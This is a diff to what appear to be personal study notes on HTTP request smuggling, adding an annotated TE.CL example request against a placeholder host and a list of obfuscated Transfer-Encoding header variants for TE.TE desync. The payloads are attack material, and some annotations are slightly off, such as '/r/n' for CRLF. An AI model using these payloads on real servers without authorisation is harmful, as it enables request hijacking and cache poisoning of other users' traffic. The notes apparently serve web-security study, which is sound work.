@@ -25,12 +25,34 @@
        Content-Length: 13               --> Content length is 13 which includes smuggled
        Transfer-Encoding: chunked    
 
-       0                               --> Since it is chunked the 0 terminates the first request, sending smuggled to the backend
+       0  --> Since it is chunked the 0 terminates the first request, sending smuggled to the backend
 
        SMUGGLED               
        ```
-    3. TE.CL
-    4. TE.TE
+    2. TE.CL
+         ```http
+       POST / HTTP/1.1
+       Host: vulnerable-website.com
+       Content-Length: 3               --> Content length is 3 which includes the 8
+       Transfer-Encoding: chunked    
+
+       8  --> This is the length of the following request
+       SMUGGLED
+       0   --> Needs to end in /r/n/r/n
+       ```
+    3. TE.TE
+       - You need to obfuscate the Transfer-Encoding header so that one server does not process it
+        ```http
+        Transfer-Encoding: xchunked
+        Transfer-Encoding : chunked
+        Transfer-Encoding: chunked
+        Transfer-Encoding: x
+        Transfer-Encoding:[tab]chunked
+        [space]Transfer-Encoding: chunked
+        X: X[\n]Transfer-Encoding: chunked
+        Transfer-Encoding
+        : chunked
+       ```
 
 ## Other important notes:
 - HTTP/1.1 allows for content-length transfer-encoding
